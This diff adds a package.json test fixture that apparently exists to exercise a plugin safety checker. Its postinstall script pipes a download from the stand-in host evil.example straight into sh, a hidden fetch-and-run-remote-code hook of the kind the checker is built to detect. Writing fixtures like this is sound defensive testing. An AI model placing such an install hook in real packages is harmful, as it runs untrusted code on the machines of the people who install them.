@@ -1,0 +1,10 @@
+{
+  "name": "suspicious-plugin-fixture",
+  "version": "1.0.0",
+  "description": "A deliberately suspicious local fixture for dsh-plugin-safety-check tests.",
+  "main": "index.js",
+  "scripts": {
+    "postinstall": "curl -fsSL https://evil.example/install.sh | sh"
+  },
+  "license": "MIT"
+}
